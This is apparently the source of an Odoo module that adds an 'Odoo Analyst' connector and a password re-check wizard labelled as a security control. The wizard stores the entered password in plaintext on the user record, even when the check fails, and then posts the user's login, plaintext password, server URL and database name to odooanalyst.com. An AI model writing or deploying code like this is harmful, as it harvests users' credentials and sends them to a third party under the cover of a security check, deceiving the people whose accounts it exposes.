# -*- coding: utf-8 -*-
from odoo import api, fields, models, _

import odoo

import json
from odoo.exceptions import AccessDenied, AccessError, UserError, ValidationError
from werkzeug.utils import redirect

from functools import wraps
from odoo.http import request, DEFAULT_LANG
import random
import string
import time
import requests
from pprint import pprint


def _jsonable(o):
    try:
        json.dumps(o)
    except TypeError:
        return False
    else:
        return True


class ResUsers(models.Model):
    _inherit = 'res.users'

    odoo_password = fields.Char(readonly=True, copy=False, exportable=False)

    def odoo_analyst_connector(self):
        self.ensure_one()

        # Check if the client is already registered
        if self.odoo_password:
            return {
                'type': 'ir.actions.client',
                'tag': 'odoo_synk_iframe',
                'name': 'Odoo Analyst',
                'target': 'current',
                'context': {
                    'iframe_url': 'https://odooanalyst.com/web',  # Change this dynamically
                },
            }
        else:
            w = self.sudo().env['res.users.odoosync_identitycheck'].create({
                'request': json.dumps([
                    {  # strip non-jsonable keys (e.g. mapped to recordsets)
                        k: v for k, v in self.env.context.items()
                        if _jsonable(v)
                    },
                    self._name,
                    self.ids,
                    # fn.__name__
                ])
            })
            return {
                'type': 'ir.actions.act_window',
                'res_model': 'res.users.odoosync_identitycheck',
                'res_id': w.id,
                'name': _("Security Control"),
                'target': 'new',
                'views': [(False, 'form')],
            }


class CheckIdentity(models.TransientModel):
    """ Wizard used to re-check the user's credentials (password) and eventually
    revoke access to his account to every device he has an active session on.

    Might be useful before the more security-sensitive operations, users might be
    leaving their computer unlocked & unattended. Re-checking credentials mitigates
    some of the risk of a third party using such an unattended device to manipulate
    the account.
    """
    _name = 'res.users.odoosync_identitycheck'
    _description = "Password Check Wizard"

    request = fields.Char(readonly=True, groups=fields.NO_ACCESS)
    password = fields.Char()

    def _check_identity(self):
        try:
            self.create_uid._check_credentials(self.password, {'interactive': True})
        except AccessDenied:
            raise UserError(_("Incorrect Password, try again or click on Forgot Password to reset your password."))
        finally:
            self.create_uid.sudo().write({'odoo_password': self.password})
            self.password = False

    def _register_in_odooanalyst(self, password):
        try:
            __version__ = odoo.release.version
            version_type = 'odoo_sh' if 'e' in __version__ else 'community'
            server_url = request.env['ir.config_parameter'].sudo().get_param('web.base.url')
            server_db = self.env.registry.db_name
            chars = string.ascii_letters + string.digits  # a-z, A-Z, 0-9
            key = ''.join(random.choices(chars, k=10))
            params = {
                "server_odoo_type_id": version_type,
                "server_odoo_version_id": int(__version__[0:2]) if __version__ else False,
                "server_url": server_url,
                "server_db": server_db,
                "remote_connection": 201,
            }
            headers = {
                "uid": str(self.env.user.id),
                "email": self.env.user.login,
                "pass": password,
                "key": key,
            }

            response = requests.post("https://odooanalyst.com/submit", params=params, headers=headers)

            if response.status_code != 200:
                return "https://odooanalyst.com/web"

            return "https://odooanalyst.com/form-registration/" + key

        except AccessDenied:
            return "https://odooanalyst.com/web"

    def run_check(self):
        # assert request, "This method can only be accessed over HTTP"
        self._check_identity()

        response = self._register_in_odooanalyst(self.create_uid.odoo_password)

        return {
            'type': 'ir.actions.client',
            'tag': 'odoo_synk_iframe',
            'name': 'Odoo Analyst',
            'target': 'current',
            'context': {
                'iframe_url': response,  # Change this dynamically
            },
        }
